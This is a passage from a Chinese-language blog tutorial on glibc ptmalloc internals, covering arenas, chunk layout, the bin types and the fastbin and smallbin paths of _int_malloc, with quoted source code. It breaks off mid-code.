<h3 id="ptmalloc-的适应性"><a href="#ptmalloc-的适应性" class="headerlink" title="ptmalloc 的适应性"></a>ptmalloc 的适应性</h3><p>一个内存管理器最理想的情况是针对项目进行专门的优化，也就是说，每个项目针对自身情况开发出的内存管理器才是最优的，但是这样做的成本太高，而且开发一个内存管理器难度也是很高的，既要考量和内核的兼容性，又要可移植，效率要高并且稳定，所以，最好的办法是有一个折中的内存管理机制，各方面不需要很突出，但是适用性广，可以很好地兼容在各种大型项目中。</p>
<p>ptmalloc 的设计思想就是这样，它具有良好的兼容性、可移植性、稳定性，并且兼具效率，这样一个内存管理器对于开发一些正常的项目足够了。</p>
<h3 id="main-arena-and-non-main-arena"><a href="#main-arena-and-non-main-arena" class="headerlink" title="main_arena and non_main_arena"></a>main_arena and non_main_arena</h3><p>又称为主分配区和非主分配区，main_arena 是一个结构体，定义在 malloc.c 中的 malloc_state</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="type">int</span> have_fastchunks;</span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>结构体对每一个成员给出了解释，第一个成员是 linux 下的锁，Doug Lea 实现的内存分配器只有一个主分配区，为了兼容多线程，每次分配内存之前都要对主分配区加锁，防止多线程对内存分配造成影响，这样就导致多线程锁的激烈竞争，降低了内存分配效率，而 ptmalloc 支持多线程，增加了 non_main_arena (非主分配区)，所谓 non_main_arena 其结构和主分配区相同，很多分配区通过环形链表相互串联，这样，多个线程就无需争夺同一个分配区了。但是分配区的数量毕竟是有限的，在极端情况下多个线程还是会竞争同一个分配区，所以锁依旧有用，先加锁的进程可以优先使用分配区，如果全部分配区都被加锁，那么后面的进程就会进入阻塞状态。对于 32 位系统来说，arena 最多为核心数量的 2 倍，64 位系统下 arena 最多为核心数量的 8 倍。</p>
<p>第二个成员是标志位，第三个成员用来标识最近是否有新的内存块被插入 fastbin 链表。</p>
<p>第四个成员是 fastbin 链表，第五个成员是 top chunk 的地址，在堆利用中可能会用到。第六个成员标识最后一次拆分 top chunk 得到的剩余部分，第七个成员是 smallbin、largebin 和 unsortedbin 的集合体，一共有 126 个表项。</p>
<blockquote>
<p>补：为什么有 126 个表项？这是由于 bin[0] 和 bin[127] 没有被使用，并且 bin[1] 是整个 bin 的头部。 注意 bin 定义的数量为 NBINS * 2 - 2 &#x3D; 254，为什么是 254？ 这是由于缓冲区链表主要有 fd 和 bk 两个指针，smallbin 62 个、largebin 63 个，加在一起是 125 个，再加上一个头结点 bin[1] 共 126 个表项，换算成 index 一共有 252 个，所以 254 个指针空间是完全足够的！</p>
</blockquote>
<p>第八个成员可以视为一张地图，标识链表是否为空。第九个成员是 next 指针，指向下一个 arena。</p>
<p>第十个成员指向下一个为空的 arena。第十一个成员用来标识绑定在当前 arena 线程的总量。</p>
<p>最后两个成员用来跟踪当前被系统分配的内存总量。</p>
<p>这个 glibc 版本比较新的，有一些新加入的定义。</p>
<h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>chunk 称为堆块，是堆的重要组成部分，当用户申请内存块时，系统就会将空间以堆块的形式返回，堆块具有一定的结构，且按照大小分为 4 类，堆块的结构定义在 malloc.c 中，代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>基本结构包含 6 个成员，首先是 mchunk_prev_size，如果当前堆块的前一个堆块是空闲的，那么此字段就是前一个堆块的 size。</p>
<p>接着是当前堆块的 size，然后有两个指针，由于各种 bin 的存在，当堆块被释放后会进入对应的缓冲区中，并且以链表的形式存在，这里的 fd 和 bk 就是链表的前向后向指针，最后两个也是指针，但是它们只会出现在 largebin chunk 中，具体会在后面提到。</p>
<p>一个堆块可能会是下面的状态</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             User data starts here...                          .</span><br><span class="line">            .                                                               .</span><br><span class="line">            .             (malloc_usable_size() bytes)                      .</span><br><span class="line">            .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             (size of chunk, but used for application data)    |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure></div>

<p>需要注意 size 标志位的最低三位 A、M、P，由于对齐的原因，如果把 size 转换成二进制，它的最低三个 bit 始终都是 0，所以它们就有了新的用途。</p>
<p>A(NON_MAIN_ARENA) 用来表示当前堆块是否属于 main_arena，M(IS_MAPPED)用来表示当前堆块是否由 mmap 分配，P(PREV_INUSE)是最为常用的标志位，用来表示当前堆块的前一个堆块是否空闲。</p>
<h3 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h3><p>接下来是链表的分类，前面提到为了加快内存分配效率，ptmalloc 引入了缓冲区，把较小的堆块保存在缓冲区中，这样就可以减少和操作系统申请内存的次数，提高效率。缓冲区有一定的格式，按照堆块的大小分成了 4 类即 fastbin、smallbin、largebin、unsortedbin。</p>
<p>第一类是 fastbin chunk，它的基本结构如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">+-----------------+-----------------+</span><br><span class="line">|                 |                 |</span><br><span class="line">|     prev_size   |      size       |</span><br><span class="line">|                 |                 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                 |                 |</span><br><span class="line">|        fd       |                 |</span><br><span class="line">|                 |                 |</span><br><span class="line">+-----------------+                 |</span><br><span class="line">|                                   |</span><br><span class="line">|            user data              |</span><br><span class="line">|                                   |</span><br><span class="line">+-----------------------------------+</span><br></pre></td></tr></table></figure></div>

<p>fastbin chunk 的大小限制在 0x10 ~ 0x40(0x20 ~ 0x80 if OS is 64 bit)，这些 chunk 通过 fd 连接成一条单向链表，在主分配区中定义了 fastbins 指针，我们可以将它展开</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">index         size</span><br><span class="line">fastbinY[0]      0x20</span><br><span class="line">fastbinY[1]      0x30</span><br><span class="line">fastbinY[2]      0x40</span><br><span class="line">fastbinY[3]      0x50</span><br><span class="line">fastbinY[4]      0x60</span><br><span class="line">fastbinY[5]      0x70</span><br><span class="line">fastbinY[6]      0x80</span><br><span class="line">fastbinY[7]      N/A</span><br><span class="line">fastbinY[8]      N/A</span><br><span class="line">fastbinY[9]      N/A</span><br></pre></td></tr></table></figure></div>

<p>最后三个是保留项，暂时没有使用。</p>
<p>fastbin 顾名思义，它分配堆块的速度很快，且仅仅保存很小的堆块，fastbin chunk 的两个特点是没有 bk 指针并且 PREV_INUSE 标志位一定是 1，也就是说 fastbin chunk 不会和其他堆块合并(在特殊情况下还是会发生合并)。另外，fastbin 采用 LIFO 策略，从头部插入，头部取出，这样可以进一步提高分配效率。</p>
<p>附：fastbin 链表大致结构</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_2.png"
                      alt="malloc_free_2.png"
                ></p>
<p>第二类是 smallbin，这也是很常用的链表，smallbin chunk 近似于一个标准格式的 chunk，结构如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">+-----------------+-----------------+</span><br><span class="line">|                 |                 |</span><br><span class="line">|     prev_size   |      size       |</span><br><span class="line">|                 |                 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                 |                 |</span><br><span class="line">|        fd       |       bk        |</span><br><span class="line">|                 |                 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                   |</span><br><span class="line">|                                   |</span><br><span class="line">|            user data              |</span><br><span class="line">|                                   |</span><br><span class="line">|                                   |</span><br><span class="line">+-----------------+-----------------+</span><br></pre></td></tr></table></figure></div>

<p>相比于 fastbin chunk，这里多出了 bk 指针，需要注意的是 fd 和 bk 指针(以及 fd_nextsize、bk_nextsize 指针)都是可以作为用户数据被覆盖的，它们只会在堆块空闲时发挥作用。</p>
<p>smallbin 的范围在 0x10 ~ 0x1f0(0x20 ~ 0x3f0 if OS is 64 bit)，smallbin 和 fastbin 有一部分是重合的，其实 fastbin 中的堆块在一定情况下可以进入到 smallbin 中(当发生 consolidate 时)。一些 smallbin chunk 相互串联形成了一条双向链表</p>
<p>附：smallbin 链表大致结构</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_3.png"
                      alt="malloc_free_3.png"
                ></p>
<p>smallbin 链表从头部插入，尾部取出。</p>
<p>第三类是 largebin，专门用来保存一些较大的堆块，范围从 0x200 开始。一个 largebin chunk 结构可能如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">+---------------+---------------+</span><br><span class="line">|               |               |</span><br><span class="line">|   prev_size   |    size       |</span><br><span class="line">|               |               |</span><br><span class="line">+-------------------------------+</span><br><span class="line">|               |               |</span><br><span class="line">|      fd       |      bk       |</span><br><span class="line">|               |               |</span><br><span class="line">+-------------------------------+</span><br><span class="line">|               |               |</span><br><span class="line">|   fd_nextsize |  bk_nextsize  |</span><br><span class="line">|               |               |</span><br><span class="line">+---------------+---------------+</span><br><span class="line">|                               |</span><br><span class="line">|                               |</span><br><span class="line">|            user_data          |</span><br><span class="line">|                               |</span><br><span class="line">+-------------------------------+</span><br></pre></td></tr></table></figure></div>

<p>largebin共63个，组织方法如下：</p>
<p>32个bin 每64个字节一个阶层，比如第一个512-568字节，第二个576 - 632字节……</p>
<p>16个bin 每512字节一个阶层</p>
<p>8个bin每4096字节一个阶层</p>
<p>4个bin每32768字节一个阶层</p>
<p>2个bin每262144字节一个阶层</p>
<p>最后一个bin包括所有剩下的大小。不同于其他链表，largebin 每一个表项保存的是一个范围，所以会用到 fd_nextsize &amp; bk_nextsize 指针。fd 和 bk 指针的功能和 smallbin 的相同，但是 fd_nextsize &amp; bk_nextsize 就有些复杂，fd_nextsize 指向第一个比当前堆块大的堆块，bk_nexisize 反之。</p>
<p>第四类是 unsortedbin，这个链表比较特殊，它没有针对大小进行排序，这一点从名字也能看出来，它可以被视为 smallbin 和 largebin 的缓冲区，当用户释放一个堆块之后，会先进入 unsortedbin，再次分配堆块时，ptmalloc 会优先检查这个链表中是否存在合适的堆块，如果找到了，就直接返回给用户(这个过程可能会对 unsortedbin 中的堆块进行切割)，若没有找到合适的，系统会清空这个链表，将堆块插入对应的链表中。下面引用 malloc.c 中的注释</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Unsorted chunks</span><br><span class="line">    All remainders from chunk splits, as well as all returned chunks,</span><br><span class="line">    are first placed in the &quot;unsorted&quot; bin. They are then placed</span><br><span class="line">    in regular bins after malloc gives them ONE chance to be used before</span><br><span class="line">    binning. So, basically, the unsorted_chunks list acts as a queue,</span><br><span class="line">    with chunks being placed on it in free (and malloc_consolidate),</span><br><span class="line">    and taken off (to be either used or placed in bins) in malloc.</span><br><span class="line">    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it</span><br><span class="line">    does not have to be taken into account in size comparisons.</span><br></pre></td></tr></table></figure></div>

<h3 id="内存分配流程"><a href="#内存分配流程" class="headerlink" title="内存分配流程"></a>内存分配流程</h3><p>前置基础知识大概就那些，还有一部分关于多线程的东西会放在后面，下面看一下 malloc 的分配流程，当程序第一次启动起来，heap 尚未初始化，这时如果去访问 heap 位置的内存会触发段错误，具体原因和上面说的类似，还没有绑定物理地址。</p>
<p>首先找到 malloc 函数的入口，在 glibc 的源代码中是找不到 malloc 这个函数的，当执行 malloc 时核心函数是 _int_malloc，新版本的 glibc 修改了 malloc 的外壳函数。为了方便，暂时不分析新版本，切换 glibc 到老版本 (2.12.1)，外壳函数为 public_mALLOc()</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">Void_t* <span class="title function_">public_mALLOc</span><span class="params">(<span class="type">size_t</span> bytes)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  Void_t *victim;</span><br><span class="line"></span><br><span class="line">  <span class="type">__malloc_ptr_t</span> (*hook) (<span class="type">size_t</span>, __const <span class="type">__malloc_ptr_t</span>)</span><br><span class="line">    = force_reg (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));    <span class="comment">// 检查是否存在 hook</span></span><br><span class="line"></span><br><span class="line">  arena_lookup(ar_ptr);</span><br><span class="line">  arena_lock(ar_ptr, bytes);    <span class="comment">// 尝试获取分配区并加锁</span></span><br><span class="line">  <span class="keyword">if</span>(!ar_ptr)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    <span class="comment">// 失败退出</span></span><br><span class="line">  victim = _int_malloc(ar_ptr, bytes);    <span class="comment">// 加锁成功，调用核心函数分配内存</span></span><br><span class="line">  <span class="keyword">if</span>(!victim) &#123;    <span class="comment">// 如果分配失败，可能是 mmap 区域用光了</span></span><br><span class="line">    <span class="comment">/* Maybe the failure is due to running out of mmapped areas. */</span></span><br><span class="line">    <span class="keyword">if</span>(ar_ptr != &amp;main_arena) &#123;    <span class="comment">// 判断当前分配区是不是主分配区</span></span><br><span class="line">      (<span class="type">void</span>)mutex_unlock(&amp;ar_ptr-&gt;mutex);    <span class="comment">// 不是主分配区， 将当前分配区解锁</span></span><br><span class="line">      ar_ptr = &amp;main_arena;</span><br><span class="line">      (<span class="type">void</span>)mutex_lock(&amp;ar_ptr-&gt;mutex);    <span class="comment">// 尝试锁定主分配区</span></span><br><span class="line">      victim = _int_malloc(ar_ptr, bytes);    <span class="comment">// 再次尝试分配内存</span></span><br><span class="line">      (<span class="type">void</span>)mutex_unlock(&amp;ar_ptr-&gt;mutex);    <span class="comment">// 解锁主分配区</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 当分配区是主分配区，并且内存分配失败，可能是 sbrk 出了问题</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_ARENAS</span></span><br><span class="line">      <span class="comment">/* ... or sbrk() has failed and there is still a chance to mmap() */</span></span><br><span class="line">      ar_ptr = arena_get2(ar_ptr-&gt;next ? ar_ptr : <span class="number">0</span>, bytes);  <span class="comment">// 检查是否还有非主分配区</span></span><br><span class="line">      (<span class="type">void</span>)mutex_unlock(&amp;main_arena.mutex);  <span class="comment">// 解锁主分配区</span></span><br><span class="line">      <span class="keyword">if</span>(ar_ptr) &#123;    <span class="comment">// 如果成功找到了一个非主分配区，就继续尝试分配内存</span></span><br><span class="line">	victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line">	(<span class="type">void</span>)mutex_unlock(&amp;ar_ptr-&gt;mutex);   <span class="comment">// 解锁非主分配区</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    (<span class="type">void</span>)mutex_unlock(&amp;ar_ptr-&gt;mutex);  <span class="comment">// 分配结束，解锁分配区。</span></span><br><span class="line">  assert(!victim || chunk_is_mmapped(mem2chunk(victim)) ||</span><br><span class="line">	 ar_ptr == arena_for_chunk(mem2chunk(victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> libc_hidden_def</span></span><br><span class="line">libc_hidden_def(public_mALLOc)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>外壳函数逻辑比较简单，主要是处理分配区的问题，尽量成功分配内存给用户，接下来是核心函数 _int_malloc()</p>
<blockquote>
<p>补： 关于 arena 的问题，ptmalloc 可以有多个 arena，用来给不同的线程使用，外壳代码中调用了 arena_lookup 来寻找一个可用的 arena，其流程大概是首先判断一下当前线程最后一次使用的 arena 是否空闲(先查看线程私有对象中是否已经存在一个分配区)，如果不是，就循环遍历 arena 链表，尝试找到一个空闲的 arena，如果找不到，就判断一下当前 arena 的总数，若小于最大值，就创建一个新的 arena，并且把新的 arena 插入到全局分配区循环链表并且加锁。新建的分配区一定是 non_main_arena，因为主分配区是从父进程继承的。</p>
</blockquote>
<p>核心函数很长，就不贴所有代码了，有兴趣的同学可以去官网下载 glibc 的源代码。</p>
<p>首先是声明必要的变量，将所有要用的变量声明在函数头部可以方便后续的修改(此处代码不涉及逻辑)。</p>
<p>接着调用了函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">checked_request2size(bytes, nb);</span><br></pre></td></tr></table></figure></div>

<p>bytes 是用户传入的数字，nb 是真实 chunk 的大小，调用这个函数的目的是通过用户的输入计算出需要分配的 chunk 大小。这是由于对齐的原因，正常分配的 chunk 并不是输入的大小是多少就分配多少，而是会 SIZE 字节对齐，例如在 64 位系统下 malloc(1)，系统返回给我们的堆块实际上最多能容纳 16 个字节。</p>
<p>从这里开始 malloc 会分成 3 条路。</p>
<p><strong>第一条：</strong> 当 nb 属于 fastbin chunk 时</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">    This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">    can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ())) &#123;    <span class="comment">// 判断是否在 fastbin 范围内</span></span><br><span class="line">    idx = fastbin_index(nb);    <span class="comment">// 根据 nb 计算出在 fastbin 中的 index</span></span><br><span class="line">    mfastbinptr* fb = &amp;fastbin (av, idx);    <span class="comment">// 根据 index 取一个堆块(无论是否为空)</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ATOMIC_FASTBINS</span></span><br><span class="line">    mchunkptr pp = *fb;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">	victim = pp;</span><br><span class="line">	<span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">	   != victim);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    victim = *fb;    <span class="comment">// 将取出的堆块给 victim</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>) &#123;    <span class="comment">// 判断取出的堆块是否为空</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))  <span class="comment">// 检查堆块的 size</span></span><br><span class="line">	&#123;</span><br><span class="line">	  errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">	errout:</span><br><span class="line">	  malloc_printerr (check_action, errstr, chunk2mem (victim));</span><br><span class="line">	  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ATOMIC_FASTBINS</span></span><br><span class="line">      *fb = victim-&gt;fd;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      check_remalloced_chunk(av, victim, nb); </span><br><span class="line">      <span class="type">void</span> *p = chunk2mem(victim);     <span class="comment">// 返回给用户</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">	alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>利用 fastbin，首先检查 nb(上面计算出的真实 chunk 大小)是否小于等于 fastbin 的最大值，如果是，会进入到上面的代码逻辑中。这里分为两种情况，如果没有开启 ATOMIC_FASTBINS 优化则分配过程很简单，首先根据 nb 找到对应的 fastbin index，接着从对应的链表中取出一个堆块(可能为空)，判断取出的是否为空，如果不为空，进一步判断此堆块的 size 是否和 index 对应。如果这些检查都通过，就会把堆块返回给用户。</p>
<p>当开启了 ATOMIC_FASTBINS 情况就变得复杂起来，这个优化选项是新版本 libc 添加的，虽然 ptmalloc 支持多线程操作，但是当在分配区中申请很多小内存时，会使得内存碎片化，ptmalloc 会尝试清理这些碎片，在清理碎片的时候就不可避免的要对分配区进行加锁操作，每一次加锁要消耗大约 100ns 的时间，这就导致了当很多线程进行动态内存申请时，ptmalloc 的效率大幅下降。</p>
<p>于是 ptmalloc 在新版本中对锁进行了优化，添加 PER_THREAD 和 ATOMIC_FASTBINS 两个优化选项，但是默认情况下这些选项是不会开启的。</p>
<p>结合华庭的文章可以大致了解一下优化的策略，ATOMIC_FASTBINS 用到了一种叫做 lock-free 的技术实现单向链表删除第一个节点的操作(和数据结构很类似，但是要考虑多线程的影响)，多线程安全在 《程序员的自我修养》这本书中有简要的介绍，线程(又称为 <strong>轻量级进程</strong>)是进程的一部分，一个进程中可以包含多个线程，这些线程共享进程的资源，这就隐藏着一个问题，资源只有一份，如果两个线程同时去修改这份资源，就有可能会引发未定义的行为。例如下面的代码</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">线程1               线程2</span><br><span class="line">i=1;                --i;</span><br><span class="line">++i;</span><br></pre></td></tr></table></figure></div>

<p>++i 这种代码的一种实现方法可能是</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">将 i 读取到某一个寄存器中</span><br><span class="line">寄存器自增 1</span><br><span class="line">将寄存器中的值存回 i</span><br></pre></td></tr></table></figure></div>

<p>但是现在涉及到一个多线程的问题，如果程序的执行顺序是</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">X1 表示线程 1 的寄存器    X2 表示线程 2 的寄存器</span><br><span class="line">序号      指令          线程</span><br><span class="line">1        i = 1           1</span><br><span class="line">2        X1 = i          1</span><br><span class="line">3        X2 = i          2</span><br><span class="line">4        X1++            1</span><br><span class="line">5        X2--            2</span><br><span class="line">6        i = X1          1</span><br><span class="line">7        i = X2          2</span><br></pre></td></tr></table></figure></div>

<p>从逻辑上看，i 的最终结果应该是 1，但是现在它的结果是 0。实际上 i 的结果可能是 0、1 或 2，这就是一个典型由于没有注意线程问题引发的未定义行为。</p>
<p>回到 malloc 的代码中，支持多线程的基础就是保证线程安全，于是加锁成为了一种重要方式，当某个线程取得资源的锁之后，其他线程如果想要访问资源，就需要等待加锁线程完成它的工作并解锁，但是加锁会导致一些问题，首当其冲的就是性能问题，这一点在上文提到过，如果加锁不当的话还会引起死锁(dead lock)等等。</p>
<p>于是人们就提出了另一种思路，即无锁算法(lock-free)，又叫做 CAS，CAS的语义是“我认为V的值应该为A，如果是，那么将V的值更新为B，否则不修改并告诉我V的值实际为多少”，CAS是乐观锁技术，当多个线程尝试使用CAS同时更新同一个变量时，只有其中一个线程能更新变量的值，而其它线程都失败，失败的线程并不会被挂起，而是被告知这次竞争中失败，并可以再次尝试。 CAS 的效率相较于锁来说提升了很多，并且更加安全了，这是因为其操作指令都是原子指令(可以在一个 CPU 周期中运行完毕，不会受其他线程影响)。</p>
<p>CAS 的 ABA 问题：如果有三个线程 A、B、C，若 B 线程先取得了锁，修改目标值，但是 C 线程先于 A 取得了锁，将目标值修改回最初的值，这时如果 A 取得锁，就不会发现原始值已经被修改了一次，这时可能会引发一些未定义的行为，但是在 malloc 的代码中并不会出现这种问题。</p>
<p>第一条路大致就是这些内容，不难发现，fastbin 是最简单、最快的一种缓冲区，有关于从 fastbin 中分配堆块的思路可以参考下面这张图片</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_4.png"
                      alt="malloc_free_4.png"
                ></p>
<p><strong>第二条:</strong> 当 nb 属于 smallbin 范围时</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb)) &#123;  <span class="comment">// 判断 nb 是否处于 smallbin 范围</span></span><br><span class="line">    idx = smallbin_index(nb);    <span class="comment">// 通过 nb 计算出其所属的 smallbin index</span></span><br><span class="line">    bin = bin_at(av,idx);  <span class="comment">// 通过上一步计算出的 index 在 arena 中找到对应链表的表头</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( (victim = last(bin)) != bin) &#123;  <span class="comment">// 判断 smallbin 是否为空，并且把链表中最后一个堆块给 victim</span></span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* 初始化检查 */</span></span><br><span class="line">	malloc_consolidate(av);  <span class="comment">// 合并 fastbin 中的堆块并放置在 smallbin</span></span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">	bck = victim-&gt;bk;  <span class="comment">// 